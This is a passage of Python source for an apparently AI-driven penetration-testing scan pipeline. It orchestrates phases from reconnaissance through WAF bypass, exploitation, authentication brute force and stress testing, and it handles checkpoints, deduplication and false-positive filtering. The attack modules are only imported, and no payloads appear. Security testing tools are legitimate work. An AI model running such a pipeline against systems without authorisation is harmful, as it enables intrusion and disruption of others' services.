"""
PHANTOM Scan Pipeline

The core engine that orchestrates the full penetration testing pipeline.
Each phase runs sequentially, with AI making decisions between phases.
"""
import asyncio
import json
import logging
import re
from collections import defaultdict
from datetime import datetime

from sqlalchemy import select, and_, text

logger = logging.getLogger(__name__)
from sqlalchemy.ext.asyncio import AsyncSession
from urllib.parse import urlparse

import app.models.database as _db
from app.models.scan import Scan, ScanLog, ScanStatus
from app.models.target import Target
from app.models.vulnerability import Vulnerability, Severity, VulnType

# Extended mapping: raw string → VulnType (covers AI-generated aliases)
VULN_TYPE_ALIASES: dict[str, VulnType] = {
    # Exact enum values
    **{v.value: v for v in VulnType},
    # Common aliases from Claude / AI modules
    "xss": VulnType.XSS_REFLECTED,
    "reflected_xss": VulnType.XSS_REFLECTED,
    "stored_xss": VulnType.XSS_STORED,
    "dom_xss": VulnType.XSS_DOM,
    "sql_injection": VulnType.SQLI,
    "sqli_error": VulnType.SQLI,
    "sqli_union": VulnType.SQLI,
    "sqli_time": VulnType.SQLI_BLIND,
    "blind_sqli": VulnType.SQLI_BLIND,
    "nosql_injection": VulnType.SQLI,
    "nosql": VulnType.SQLI,
    "injection": VulnType.SQLI,
    "command_injection": VulnType.CMD_INJECTION,
    "os_command_injection": VulnType.CMD_INJECTION,
    "server_side_request_forgery": VulnType.SSRF,
    "server_side_template_injection": VulnType.SSTI,
    "template_injection": VulnType.SSTI,
    "remote_code_execution": VulnType.RCE,
    "code_execution": VulnType.RCE,
    "local_file_inclusion": VulnType.LFI,
    "file_inclusion": VulnType.LFI,
    "remote_file_inclusion": VulnType.RFI,
    "xml_external_entity": VulnType.XXE,
    "insecure_direct_object_reference": VulnType.IDOR,
    "broken_access_control": VulnType.AUTH_BYPASS,
    "broken_auth": VulnType.AUTH_BYPASS,
    "authentication_bypass": VulnType.AUTH_BYPASS,
    "authorization_bypass": VulnType.AUTH_BYPASS,
    "rate_limit_bypass": VulnType.MISCONFIGURATION,
    "rate_limiting": VulnType.MISCONFIGURATION,
    "information_disclosure": VulnType.INFO_DISCLOSURE,
    "sensitive_data_exposure": VulnType.INFO_DISCLOSURE,
    "cors": VulnType.CORS_MISCONFIGURATION,
    "cors_misconfiguration": VulnType.CORS_MISCONFIGURATION,
    "misconfig": VulnType.MISCONFIGURATION,
    "security_misconfiguration": VulnType.MISCONFIGURATION,
    "open_redirect": VulnType.OPEN_REDIRECT,
    "redirect": VulnType.OPEN_REDIRECT,
    "url_redirect": VulnType.OPEN_REDIRECT,
    "path_traversal": VulnType.PATH_TRAVERSAL,
    "directory_traversal": VulnType.PATH_TRAVERSAL,
    "jwt": VulnType.JWT_VULN,
    "jwt_vulnerability": VulnType.JWT_VULN,
    "race_condition": VulnType.RACE_CONDITION,
    "toctou": VulnType.RACE_CONDITION,
    "file_upload": VulnType.FILE_UPLOAD,
    "unrestricted_file_upload": VulnType.FILE_UPLOAD,
    "deserialization": VulnType.DESERIALIZATION,
    "insecure_deserialization": VulnType.DESERIALIZATION,
    "subdomain_takeover": VulnType.SUBDOMAIN_TAKEOVER,
    "privilege_escalation": VulnType.PRIVILEGE_ESCALATION,
    "business_logic": VulnType.BUSINESS_LOGIC,
    "csrf": VulnType.CSRF,
    "request_smuggling": VulnType.MISCONFIGURATION,
    "http_request_smuggling": VulnType.MISCONFIGURATION,
    "http_smuggling": VulnType.MISCONFIGURATION,
    "mass_assignment": VulnType.MISCONFIGURATION,
    "parameter_pollution": VulnType.MISCONFIGURATION,
    "cache_poisoning": VulnType.MISCONFIGURATION,
    "cache_deception": VulnType.INFO_DISCLOSURE,
    "web_cache_poisoning": VulnType.MISCONFIGURATION,
    "web_cache_deception": VulnType.INFO_DISCLOSURE,
    "graphql": VulnType.MISCONFIGURATION,
    "graphql_introspection": VulnType.MISCONFIGURATION,
    "graphql_injection": VulnType.SQLI,
    "graphql_sqli": VulnType.SQLI,
    "graphql_nosql": VulnType.SQLI,
    "graphql_dos": VulnType.MISCONFIGURATION,
    "graphql_batching": VulnType.MISCONFIGURATION,
    "graphql_authz_bypass": VulnType.AUTH_BYPASS,
    "graphql_info_disclosure": VulnType.INFO_DISCLOSURE,
    "mfa_bypass": VulnType.AUTH_BYPASS,
    "2fa_bypass": VulnType.AUTH_BYPASS,
    "otp_bypass": VulnType.AUTH_BYPASS,
    "two_factor_bypass": VulnType.AUTH_BYPASS,
    "account_enumeration": VulnType.INFO_DISCLOSURE,
    "user_enumeration": VulnType.INFO_DISCLOSURE,
}
from app.modules.recon import ReconModule
from app.modules.subdomain import SubdomainModule
from app.modules.portscan import PortScanModule
from app.modules.fingerprint import FingerprintModule
from app.modules.endpoint import EndpointModule
from app.modules.scanner import VulnerabilityScanner
from app.modules.payload_gen import PayloadGenerator
from app.modules.waf import WAFModule
from app.modules.exploiter import Exploiter
from app.modules.evidence import EvidenceCollector
from app.modules.reporter import ReportGenerator
from app.core.orchestrator import AIOrchestrator
from app.modules.external_apis import ExternalAPIs
from app.modules.nuclei import NucleiModule
from app.modules.service_attack import ServiceAttackModule
from app.modules.sensitive_files import SensitiveFilesModule
from app.modules.auth_attack import AuthAttackModule
from app.modules.mfa_bypass import MFABypassModule
from app.modules.account_enumeration import AccountEnumerationModule
from app.modules.stress_test import StressTestModule
from app.core.attack_router import AttackRouter
from app.core.realtime_learner import RealtimeLearner
from app.core.cross_scan_intel import CrossScanIntel
from app.modules.api_discovery import run_api_discovery
from app.modules.security_analyzer import run_security_analysis
from app.modules.vuln_confirmer import VulnConfirmer
from app.modules.application_graph import ApplicationGraphBuilder
from app.modules.stateful_crawler import StatefulCrawler
from app.modules.business_logic import BusinessLogicTester
from app.modules.auto_register import AutoRegister
from app.modules.request_smuggling import RequestSmugglingModule
from app.modules.mass_assignment import MassAssignmentModule
from app.modules.cache_poisoning import CachePoisoningModule
from app.modules.graphql_attacks import GraphQLAttackModule
from app.core.attack_planner import AttackPlanner
from app.core.phase_optimizer import PhaseOptimizer

# Phase definitions with progress percentages
PHASES = [
    ("recon", "Reconnaissance", 4),
    ("subdomain", "Subdomain Discovery", 9),
    ("portscan", "Port Scanning", 15),
    ("fingerprint", "Technology Fingerprinting", 20),
    ("attack_routing", "Adaptive Attack Routing", 23),
    ("endpoint", "Endpoint Discovery", 28),
    ("app_graph", "Application Graph", 32),
    ("stateful_crawl", "Stateful Crawling", 34),
    ("auto_register", "Auto Account Registration", 38),
    ("sensitive_files", "Sensitive File Discovery", 42),
    ("vuln_scan", "Vulnerability Scanning", 46),
    ("nuclei", "Nuclei Deep Scan", 52),
    ("ai_analysis", "AI Analysis & Strategy", 56),
    ("payload_gen", "Payload Generation", 59),
    ("waf", "WAF Detection & Bypass", 63),
    ("exploit", "Exploitation", 68),
    ("service_attack", "Service & Port Attack", 73),
    ("auth_attack", "Auth Brute Force", 77),
    ("business_logic", "Business Logic Testing", 81),
    ("stress_test", "Resilience Testing", 84),
    ("vuln_confirm", "Vulnerability Confirmation", 88),
    ("claude_collab", "Claude Deep Analysis", 90),
    ("attack_planner", "AI Attack Planner", 94),
    ("evidence", "Evidence Collection", 97),
    ("report", "Report Generation", 100),
]


class ScanPipeline:
    def __init__(self, scan_id: str, celery_task=None):
        self.scan_id = scan_id
        self.celery_task = celery_task
        self.context = {}  # Shared data between phases
        self._idor_seen: set = set()  # Dedup proven IDOR findings
        self._scope = None  # ScopeEnforcer, initialized in run()
        self.realtime_learner = RealtimeLearner()
        self.cross_scan_intel = CrossScanIntel()

    # Context fields to persist in checkpoints (must be JSON-serializable)
    CHECKPOINT_FIELDS = [
        "endpoints", "technologies", "subdomains", "recon_data", "open_ports",
        "scan_results", "vulnerabilities", "waf_info", "application_graph",
        "stateful_crawl", "fingerprint_data", "base_url", "domain", "target_id",
        "scan_id", "ports", "payloads", "evidence", "scope", "is_internal",
        "reachable", "rate_limit", "scan_type", "stealth", "bounty_mode",
        "custom_headers", "bounty_rules", "proxy_url", "cross_scan_intel",
        "auto_register_result", "js_api_endpoints",
    ]

    def _make_json_serializable(self, obj):
        """Recursively convert sets and other non-JSON types to serializable forms."""
        if isinstance(obj, set):
            return list(obj)
        if isinstance(obj, dict):
            return {k: self._make_json_serializable(v) for k, v in obj.items()}
        if isinstance(obj, (list, tuple)):
            return [self._make_json_serializable(v) for v in obj]
        if isinstance(obj, datetime):
            return obj.isoformat()
        if isinstance(obj, bytes):
            return obj.decode("utf-8", errors="replace")
        # Skip non-serializable objects (callables, modules, etc.)
        try:
            json.dumps(obj)
            return obj
        except (TypeError, ValueError):
            return str(obj)

    async def _save_checkpoint(self, db: AsyncSession, scan: Scan, phase_name: str, phase_index: int):
        """Save checkpoint after a successful phase so scan can resume on crash."""
        try:
            context_snapshot = {}
            for field in self.CHECKPOINT_FIELDS:
                if field in self.context:
                    context_snapshot[field] = self._make_json_serializable(self.context[field])

            checkpoint = {
                "last_completed_phase": phase_name,
                "phase_index": phase_index,
                "timestamp": datetime.utcnow().isoformat(),
                "context_snapshot": context_snapshot,
            }

            config = scan.config or {}
            config["_checkpoint"] = checkpoint
            scan.config = config
            # Force SQLAlchemy to detect the JSON mutation
            from sqlalchemy.orm.attributes import flag_modified
            flag_modified(scan, "config")
            await db.commit()
        except Exception as e:
            logger.warning(f"Checkpoint save failed for phase {phase_name}: {e}")
            # Non-fatal — scan continues even if checkpoint fails

    def _restore_checkpoint(self, scan: Scan) -> dict | None:
        """Check if scan has a checkpoint to resume from. Returns checkpoint dict or None."""
        config = scan.config or {}
        checkpoint = config.get("_checkpoint")
        if not checkpoint or not checkpoint.get("last_completed_phase"):
            return None
        return checkpoint

    def _apply_checkpoint_context(self, checkpoint: dict):
        """Restore context fields from checkpoint snapshot."""
        snapshot = checkpoint.get("context_snapshot", {})
        for field, value in snapshot.items():
            # Don't overwrite fields that were already set during init (target_id, scan_id, etc.)
            # But DO overwrite discovery data (endpoints, technologies, etc.)
            self.context[field] = value

    @staticmethod
    def _normalize_url(url: str) -> str:
        """Strip query params and fragment for dedup comparison."""
        if not url:
            return ""
        parsed = urlparse(url)
        # Normalize default ports: strip :80 for http, :443 for https
        netloc = parsed.netloc
        if parsed.scheme == "http" and netloc.endswith(":80"):
            netloc = netloc[:-3]
        elif parsed.scheme == "https" and netloc.endswith(":443"):
            netloc = netloc[:-4]
        return f"{parsed.scheme}://{netloc}{parsed.path}".rstrip("/").lower()

    @staticmethod
    def _normalize_url_aggressive(url: str) -> str:
        """Aggressive URL normalization for auth_bypass / idor dedup.

        - Strips query params and fragments
        - Normalizes default ports
        - Strips trailing numbers from path segments (admin.jsp70 → admin.jsp)
        - Collapses duplicate consecutive path segments (/login.aspx/login.aspx → /login.aspx)
        """
        if not url:
            return ""
        parsed = urlparse(url)
        netloc = parsed.netloc
        if parsed.scheme == "http" and netloc.endswith(":80"):
            netloc = netloc[:-3]
        elif parsed.scheme == "https" and netloc.endswith(":443"):
            netloc = netloc[:-4]

        path = parsed.path or "/"
        # Strip trailing numbers from path segments:
        # admin.jsp70 → admin.jsp, page47 → page (but keep purely numeric segments like /api/v2)
        # Also strip trailing "Informational", "Error", etc. junk appended to extensions
        segments = path.split("/")
        cleaned = []
        for seg in segments:
            if not seg:
                cleaned.append(seg)
                continue
            # Strip trailing digits from segments that have a non-digit prefix
            # e.g. admin.jsp70 → admin.jsp, login5 → login, but 123 stays 123
            cleaned_seg = re.sub(r'^(.+?[a-zA-Z._-])\d+$', r'\1', seg)
            # Strip trailing known junk words (case-insensitive)
            cleaned_seg = re.sub(r'(\.(?:jsp|asp|aspx|php|html?))[A-Z][a-zA-Z]*$', r'\1', cleaned_seg)
            cleaned.append(cleaned_seg)
        path = "/".join(cleaned)

        # Collapse duplicate consecutive path segments: /login.aspx/login.aspx → /login.aspx
        parts = [p for p in path.split("/") if p]
        deduped_parts = []
        for p in parts:
            if not deduped_parts or deduped_parts[-1].lower() != p.lower():
                deduped_parts.append(p)
        path = "/" + "/".join(deduped_parts) if deduped_parts else "/"

        return f"{parsed.scheme}://{netloc}{path}".rstrip("/").lower()

    @staticmethod
    def _get_url_dir_prefix(url: str) -> str:
        """Get the directory prefix of a URL path for per-prefix counting.

        /admin/admin.jsp → /admin/
        /api/v2/users/1 → /api/v2/users/
        """
        if not url:
            return "/"
        parsed = urlparse(url)
        path = parsed.path or "/"
        # Get directory part (everything up to and including last /)
        last_slash = path.rfind("/")
        if last_slash > 0:
            return path[:last_slash + 1].lower()
        return "/".lower()

    @staticmethod
    def _normalize_biz_logic_title(title: str) -> str:
        """Strip URL/endpoint-specific parts from a business logic title for conceptual dedup.

        Examples:
            'Workflow Bypass at /catalog' → 'Workflow Bypass'
            'Price Manipulation: negative value accepted for fee (POST /api/order)' → 'Price Manipulation: negative value accepted for fee'
        """
        if not title:
            return ""
        # Remove trailing '(METHOD /path...)' or '(METHOD https://...)'
        normalized = re.sub(r'\s*\((?:GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+\S+\)\s*$', '', title, flags=re.IGNORECASE)
        # Remove trailing 'at /path' or 'at https://...'
        normalized = re.sub(r'\s+at\s+(?:https?://\S+|/\S+)\s*$', '', normalized, flags=re.IGNORECASE)
        # Remove trailing 'on /path' or 'on https://...'
        normalized = re.sub(r'\s+on\s+(?:https?://\S+|/\S+)\s*$', '', normalized, flags=re.IGNORECASE)
        # Remove trailing '— /path' or '- /path'
        normalized = re.sub(r'\s*[—–-]\s*(?:https?://\S+|/\S+)\s*$', '', normalized)
        return normalized.strip()

    async def _save_vuln_deduped(
        self,
        db: AsyncSession,
        vuln: Vulnerability,
        scan: Scan = None,
        track_context: bool = False,
        finding_dict: dict = None,
    ) -> Vulnerability | None:
        """Save a vulnerability only if no duplicate exists for this target.

        Dedup key: (target_id, vuln_type, normalized_url, parameter).
        Returns the vuln if saved, None if duplicate.
        """
        # --- Scope enforcement: reject out-of-scope URLs ---
        if hasattr(self, '_scope') and vuln.url:
            if not self._scope.is_in_scope(vuln.url):
                logger.debug(f"Rejected out-of-scope vuln: {vuln.url}")
                return None

        # --- Aggressive dedup for auth_bypass and idor ---
        _aggressive_types = {VulnType.AUTH_BYPASS, VulnType.IDOR}
        is_aggressive = vuln.vuln_type in _aggressive_types

        if is_aggressive:
            norm_url = self._normalize_url_aggressive(vuln.url or "")
        else:
            norm_url = self._normalize_url(vuln.url or "")

        conditions = [
            Vulnerability.target_id == vuln.target_id,
            Vulnerability.vuln_type == vuln.vuln_type,
            Vulnerability.scan_id == vuln.scan_id,
        ]

        if is_aggressive and norm_url:
            # For auth_bypass/idor: match on aggressively normalized URL
            # This collapses admin.jsp70 / admin.jsp47 / admin.jspInformational into one
            conditions.append(Vulnerability.url.like(f"{norm_url}%"))
        elif norm_url:
            # Standard: match on URL path prefix
            parsed = urlparse(vuln.url or "")
            netloc = parsed.netloc
            if parsed.scheme == "http" and netloc.endswith(":80"):
                netloc = netloc[:-3]
            elif parsed.scheme == "https" and netloc.endswith(":443"):
                netloc = netloc[:-4]
            url_path = f"{parsed.scheme}://{netloc}{parsed.path}".rstrip("/")
            conditions.append(Vulnerability.url.like(f"{url_path}%"))

        # Dedup within same scan: same URL path + same type
        # This catches duplicate findings like 8 XSS on same endpoint with different payloads
        existing = await db.execute(
            select(Vulnerability.id).where(and_(*conditions)).limit(1)
        )
        if existing.scalar_one_or_none():
            return None  # Duplicate within this scan — skip

        # --- Per-type count limits for auth_bypass and idor ---
        if is_aggressive:
            dir_prefix = self._get_url_dir_prefix(vuln.url or "")
            # Count how many vulns of this type already exist under same dir prefix
            prefix_count_q = await db.execute(
                select(Vulnerability.url).where(and_(
                    Vulnerability.target_id == vuln.target_id,
                    Vulnerability.vuln_type == vuln.vuln_type,
                    Vulnerability.scan_id == vuln.scan_id,
                ))
            )
            existing_urls = prefix_count_q.scalars().all()
            same_prefix_count = sum(
                1 for u in existing_urls
                if self._get_url_dir_prefix(u or "").rstrip("/") == dir_prefix.rstrip("/")
            )
            # Max 3 auth_bypass per directory prefix, max 2 idor per base URL
            max_per_prefix = 3 if vuln.vuln_type == VulnType.AUTH_BYPASS else 2
            if same_prefix_count >= max_per_prefix:
                return None  # Too many findings of this type under same path prefix

        # Business logic conceptual dedup: same normalized title = same finding
        # even on different URLs (e.g. "Price Manipulation" on /order vs /checkout)
        if vuln.vuln_type == VulnType.BUSINESS_LOGIC and vuln.title:
            norm_title = self._normalize_biz_logic_title(vuln.title)
            if norm_title:
                biz_existing = await db.execute(
                    select(Vulnerability.id).where(and_(
                        Vulnerability.target_id == vuln.target_id,
                        Vulnerability.vuln_type == VulnType.BUSINESS_LOGIC,
                        Vulnerability.scan_id == vuln.scan_id,
                    ))
                )
                biz_ids = biz_existing.scalars().all()
                if biz_ids:
                    # Check titles of existing business_logic vulns in this scan
                    biz_vulns = await db.execute(
                        select(Vulnerability.title).where(
                            Vulnerability.id.in_(biz_ids)
                        )
                    )
                    existing_titles = biz_vulns.scalars().all()
                    matches = sum(
                        1 for t in existing_titles
                        if self._normalize_biz_logic_title(t or "") == norm_title
                    )
                    if matches >= 3:
                        return None  # Max 3 same-concept business logic findings per scan

        # Sanitize: AI sometimes returns list instead of str for text fields
        for attr in ("remediation", "description", "impact", "payload_used", "ai_analysis", "title"):
            val = getattr(vuln, attr, None)
            if isinstance(val, list):
                setattr(vuln, attr, "\n".join(str(v) for v in val))
            elif isinstance(val, dict):
                setattr(vuln, attr, json.dumps(val, default=str))

        db.add(vuln)
        await db.flush()

        # Update scan vulns_found counter
        if not scan and vuln.scan_id:
            result = await db.execute(select(Scan).where(Scan.id == vuln.scan_id))
            scan = result.scalar_one_or_none()
        if scan:
            scan.vulns_found = (scan.vulns_found or 0) + 1
            await db.flush()

        # Track in context for downstream phases
        if track_context and finding_dict:
            self.context.setdefault("vulnerabilities", []).append(finding_dict)

        return vuln

    async def log(self, db: AsyncSession, phase: str, message: str, level: str = "info", data: dict = None):
        log_entry = ScanLog(
            scan_id=self.scan_id,
            phase=phase,
            level=level,
            message=message,
            data=data,
        )
        db.add(log_entry)
        try:
            await db.flush()
        except Exception as flush_err:
            # Session may be corrupted — rollback and retry once
            try:
                await db.rollback()
                db.add(ScanLog(scan_id=self.scan_id, phase=phase, level=level, message=message, data=data))
                await db.flush()
            except Exception:
                logger.error(f"Log write failed for scan {self.scan_id}: {flush_err}")

        # Broadcast log via Redis pub/sub
        await self._publish({
            "type": "log",
            "phase": phase,
            "level": level,
            "message": message,
        })

    async def update_progress(self, db: AsyncSession, scan: Scan, phase: str, progress: float):
        scan.current_phase = phase
        scan.progress_percent = progress
        await db.flush()

        await self._publish({
            "type": "progress",
            "phase": phase,
            "progress": progress,
            "vulns_found": scan.vulns_found,
            "endpoints_found": scan.endpoints_found,
            "subdomains_found": scan.subdomains_found,
        })

    async def _publish(self, event: dict):
        """Publish event to Redis for WebSocket forwarding."""
        try:
            from app.api.websocket import publish_scan_event
            await publish_scan_event(self.scan_id, event)
        except Exception as e:
            logger.debug(f"WebSocket publish failed (non-fatal): {e}")

    async def _filter_false_positives(self, findings: list[dict], db: AsyncSession, phase: str) -> list[dict]:
        """Filter out findings that match known false-positive patterns from the KnowledgeBase.

        Compares each finding against stored FP indicators by vuln_type, URL path,
        title, and payload similarity. Returns only findings that don't match FP patterns.
        """
        if not findings:
            return findings

        try:
            from app.core.knowledge import KnowledgeBase
            kb = KnowledgeBase()
            fp_patterns = await kb.get_false_positive_patterns(db)
        except Exception as e:
            # If knowledge base is unavailable, pass all findings through
            await self.log(db, phase, f"FP filter: could not load patterns: {e}", "warning")
            return findings

        if not fp_patterns:
            return findings

        # Build lookup: vuln_type → list of indicator strings
        from collections import defaultdict
        fp_by_type: dict[str | None, list[str]] = defaultdict(list)
        for pat in fp_patterns:
            vt = pat.get("vuln_type")
            indicator = pat.get("indicator", "")
            if indicator:
                fp_by_type[vt].append(indicator)

        kept = []
        filtered_count = 0

        for finding in findings:
            f_vtype = finding.get("vuln_type", "")
            f_url = finding.get("url", "")
            f_title = finding.get("title", "")
            f_payload = finding.get("payload") or finding.get("payload_used", "")

            # Extract URL path for comparison
            f_path = ""
            if f_url:
                from urllib.parse import urlparse
                try:
                    f_path = urlparse(f_url).path or "/"
                except Exception:
                    pass

            is_fp = False
            # Check indicators for this vuln_type + global (None type) patterns
            candidate_indicators = fp_by_type.get(f_vtype, []) + fp_by_type.get(None, [])

            for indicator in candidate_indicators:
                # Match by indicator type prefix
                if indicator.startswith("url_path:") and f_path:
                    if indicator[9:] == f_path:
                        is_fp = True
                        break
                elif indicator.startswith("title:") and f_title:
                    if indicator[6:] == f_title:
                        is_fp = True
                        break
                elif indicator.startswith("payload:") and f_payload:
                    if indicator[8:] == f_payload:
                        is_fp = True
                        break
                elif indicator.startswith("reason:"):
                    # Reason-based indicators: check if any part matches title or URL
                    reason_text = indicator[7:].lower()
                    if reason_text in f_title.lower() or reason_text in f_url.lower():
                        is_fp = True
                        break
                elif not indicator.startswith(("url_path:", "title:", "payload:", "reason:")):
                    # Legacy/plain indicators — substring match against title and URL
                    if indicator.lower() in f_title.lower() or indicator.lower() in f_url.lower():
                        is_fp = True
                        break

            if is_fp:
                filtered_count += 1
            else:
                kept.append(finding)

        if filtered_count:
            await self.log(db, phase,
                f"FP intelligence: filtered {filtered_count} likely false positives, kept {len(kept)} findings")

        # Structural FP filter: reject common non-vulnerabilities regardless of KB
        final = []
        structural_filtered = 0
        for finding in kept:
            reason = self._structural_fp_check(finding)
            if reason:
                structural_filtered += 1
            else:
                final.append(finding)

        if structural_filtered:
            await self.log(db, phase,
                f"Structural FP filter: removed {structural_filtered} non-vulnerabilities")

        return final

    @staticmethod
    def _structural_fp_check(finding: dict) -> str | None:
        """Check for common structural false positives. Returns reason or None."""
        title = (finding.get("title") or "").lower()
        description = (finding.get("description") or "").lower()
        vuln_type = (finding.get("vuln_type") or "").lower()
        severity = (finding.get("severity") or "").lower()
        url = (finding.get("url") or "").lower()

        # Rate limiting is a security feature
        if "rate limit" in title and "bypass" not in title:
            return "rate_limiting_is_good"

        # Staging/test environments are not vulns
        staging_keywords = ("staging", "test environment", "test subdomain",
                           "publicly accessible staging", "publicly accessible test",
                           "pre-release environment")
        if any(kw in title for kw in staging_keywords):
            return "staging_not_vuln"

        # Info-only findings with no real impact
        if severity == "info" and vuln_type not in ("info_disclosure",):
            return "info_severity_filtered"

        return None

    async def run(self):
        async with _db.async_session() as db:
            # Load scan and target
            result = await db.execute(select(Scan).where(Scan.id == self.scan_id))
            scan = result.scalar_one_or_none()
            if not scan:
                return

            result = await db.execute(select(Target).where(Target.id == scan.target_id))
            target = result.scalar_one_or_none()
            if not target:
                return

            # Start scan
            scan.status = ScanStatus.RUNNING
            scan.started_at = datetime.utcnow()
            await db.commit()

            # Determine base URL for the target
            domain = target.domain
            # Internal if: IP address, host:port, or bare hostname (no dots = Docker/local)
            if ":" in domain or domain.replace(".", "").isdigit() or "." not in domain:
                base_url = f"http://{domain}"
                is_internal = True
            else:
                # Auto-detect HTTP vs HTTPS
                is_internal = False
                try:
                    import httpx
                    async with httpx.AsyncClient(verify=False, timeout=5.0, follow_redirects=True) as _probe:
                        try:
                            r = await _probe.head(f"https://{domain}")
                            base_url = f"https://{domain}"
                        except Exception:
                            base_url = f"http://{domain}"
                except Exception:
                    base_url = f"https://{domain}"

            self.context = {
                "target_id": target.id,
                "domain": domain,
                "base_url": base_url,
                "is_internal": is_internal,
                "scope": target.scope,
                "scan_id": scan.id,
                "subdomains": [],
                "ports": {},
                "technologies": {},
                "endpoints": [],
                "vulnerabilities": [],
                "waf_info": None,
                "payloads": [],
                "evidence": [],
                "rate_limit": target.rate_limit,
            }

            # Apply scan config overrides
            config = scan.config or {}
            self.context["custom_headers"] = config.get("custom_headers", {})
            self.context["bounty_rules"] = config.get("bounty_rules", {})
            self.context["proxy_url"] = config.get("proxy_url", "")
            if config.get("rate_limit"):
                self.context["rate_limit"] = config["rate_limit"]

            # Configure shared HTTP client for this scan
            from app.utils.http_client import configure as configure_http
            configure_http(
                custom_headers=self.context.get("custom_headers", {}),
                proxy_url=self.context.get("proxy_url", ""),
                timeout=config.get("timeout", 10.0),
            )

            # Initialize scope enforcer
            from app.utils.scope import ScopeEnforcer
            scope_config = target.scope or config.get("scope")
            self._scope = ScopeEnforcer(scope_config, base_domain=target.domain)
            self.context["scope_enforcer"] = self._scope
            scope_summary = self._scope.get_summary()
            if scope_config:
                await self.log(db, "scope", f"Scope enforced: {scope_summary}")

            # --- Reachability pre-check ---
            try:
                import httpx
                reachable = False
                probe_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                async with httpx.AsyncClient(verify=False, timeout=15.0, follow_redirects=True, headers=probe_headers) as probe:
                    # Try base_url first, then fallback to alternate scheme
                    urls_to_try = [base_url]
                    if base_url.startswith("http://"):
                        urls_to_try.append(base_url.replace("http://", "https://", 1))
                    elif base_url.startswith("https://"):
                        urls_to_try.append(base_url.replace("https://", "http://", 1))

                    for try_url in urls_to_try:
                        try:
                            # Use GET instead of HEAD — some servers/LBs reject HEAD
                            resp = await probe.get(try_url)
                            reachable = True
                            # Update base_url if alternate scheme worked
                            if try_url != base_url:
                                base_url = try_url
                                self.context["base_url"] = base_url
                            await self.log(db, "reachability", f"Target reachable: {try_url} (HTTP {resp.status_code})")
                            break
                        except Exception:
                            continue

                self.context["reachable"] = reachable
                if not reachable:
                    raise Exception(f"All URLs failed: {urls_to_try}")
            except Exception as e:
                self.context["reachable"] = False
                await self.log(db, "reachability", f"Target unreachable: {base_url} ({e})", "warning")
                # For non-training scans, fail early
                if not (config or {}).get("training_mode"):
                    scan.status = ScanStatus.FAILED
                    scan.completed_at = datetime.utcnow()
                    await self.log(db, "error", f"Scan aborted: target {domain} is unreachable", "error")
                    await db.commit()
                    return
            await db.commit()

            # Determine phases based on scan type
            scan_type = scan.scan_type.value if hasattr(scan.scan_type, 'value') else str(scan.scan_type)
            self.context["scan_type"] = scan_type

            try:
                # AI Agent mode — autonomous decision-making
                if scan_type.lower() == "ai":
                    from app.core.agent import AIAgent
                    await self.log(db, "start", f"Starting AI Agent scan on {target.domain}")
                    await db.commit()

                    agent = AIAgent(self.scan_id)
                    vulns = await agent.run(db, scan, target)

                    scan.status = ScanStatus.COMPLETED
                    scan.completed_at = datetime.utcnow()
                    scan.subdomains_found = len(agent.context.get("subdomains", []))
                    scan.endpoints_found = len(agent.context.get("endpoints", []))
                    scan.vulns_found = len(vulns)
                    await self.log(db, "complete",
                        f"AI Agent scan completed. Found {scan.vulns_found} vulnerabilities "
                        f"in {agent.step} steps.", "success")
                    await self._publish({
                        "type": "complete",
                        "vulns_found": scan.vulns_found,
                        "endpoints_found": scan.endpoints_found,
                        "subdomains_found": scan.subdomains_found,
                    })
                    await db.commit()

                else:
                    # Classic pipeline mode
                    phases = self._get_phases_for_type(scan_type)
                    await self.log(db, "start", f"Starting {scan_type} scan on {target.domain} ({len(phases)} phases)")
                    await db.commit()

                    # --- Check for checkpoint (resume after crash) ---
                    checkpoint = self._restore_checkpoint(scan)
                    resume_from_index = -1
                    if checkpoint:
                        resume_from_index = checkpoint["phase_index"]
                        self._apply_checkpoint_context(checkpoint)
                        await self.log(db, "checkpoint",
                            f"Resuming from checkpoint: phase '{checkpoint['last_completed_phase']}' "
                            f"(index {resume_from_index}), skipping {resume_from_index + 1} completed phases",
                            "success")
                        await db.commit()

                    # --- Cross-Scan Intelligence: enrich context before phases ---
                    if resume_from_index < 0:
                        # Only run cross-scan intel on fresh starts (not resumes)
                        try:
                            await self.cross_scan_intel.enrich_context(self.context, db)
                            intel = self.context.get("cross_scan_intel", {})
                            preds = intel.get("predictions", [])
                            xpayloads = intel.get("cross_scan_payloads_added", 0)
                            if preds:
                                top = preds[0]
                                await self.log(db, "intel",
                                    f"Cross-scan intel: {'+'.join(top.get('technologies', [])[:3])} targets have "
                                    f"{top['probability']*100:.0f}% {top['vuln_type']} rate, "
                                    f"added {xpayloads} cross-scan payloads")
                            elif xpayloads:
                                await self.log(db, "intel",
                                    f"Cross-scan intel: added {xpayloads} payloads from similar targets")
                            await db.commit()
                        except Exception as e:
                            await self.log(db, "intel", f"Cross-scan intel skipped: {e}", "warning")
                            await db.commit()

                    # --- Dynamic Phase Refinement ---
                    # After fingerprint completes, ask AI to optimize attack phase order
                    # This runs recon phases internally, then reorders attack phases
                    phases = await self._maybe_optimize_phases(db, phases, resume_from_index)

                    # If recon phases were already run by optimizer, skip them in the main loop
                    recon_already_run = self.context.pop("_recon_already_run", -1)
                    effective_resume = max(resume_from_index, recon_already_run)

                    for idx, (phase_name, progress, phase_func) in enumerate(phases):
                        # Skip phases already completed (by checkpoint or by optimizer)
                        if idx <= effective_resume:
                            continue
                        await self._run_phase(db, scan, phase_name, progress, phase_func, phase_index=idx)

                    # --- Multi-Round Scanning ---
                    total_rounds = config.get("rounds", 1)
                    is_continuous = config.get("continuous", False)

                    if total_rounds > 1 or is_continuous:
                        await self._run_additional_rounds(
                            db, scan, target, total_rounds, is_continuous
                        )

                    # Clear checkpoint on successful completion
                    if scan.config and "_checkpoint" in scan.config:
                        scan.config.pop("_checkpoint", None)
                        from sqlalchemy.orm.attributes import flag_modified
                        flag_modified(scan, "config")

                    # Save scan data (graph, technologies, etc.) for API access
                    scan.data = {
                        "application_graph": self.context.get("application_graph", {}),
                        "technologies": self.context.get("technologies", []),
                        "recon_data": self.context.get("recon_data", {}),
                        "fingerprint_data": self.context.get("fingerprint_data", {}),
                        "open_ports": self.context.get("open_ports", []),
                        "subdomains": self.context.get("subdomains", []),
                        "endpoints": [
                            {"url": ep.get("url") if isinstance(ep, dict) else ep}
                            for ep in (self.context.get("endpoints") or [])[:200]
                        ],
                        "waf_info": self.context.get("waf_info", {}),
                        "stateful_crawl": {
